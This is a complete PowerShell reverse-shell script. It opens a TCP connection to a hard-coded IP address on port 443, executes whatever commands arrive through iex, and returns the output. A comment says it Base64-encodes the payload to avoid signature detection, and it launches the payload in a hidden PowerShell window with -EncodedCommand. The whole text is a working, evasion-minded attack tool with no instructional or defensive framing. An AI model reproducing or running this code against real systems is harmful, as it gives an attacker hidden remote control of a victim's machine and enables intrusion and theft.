$ip = '10.211.55.5'
$port = 443

# Obfuscation: Using Base64 encoding and string manipulation to avoid static signature detection
$cmd = "
$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
};
$client.Close();
"

# The script is executed by invoking PowerShell with the -EncodedCommand flag
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell.exe -WindowStyle Hidden -EncodedCommand $encodedCommand
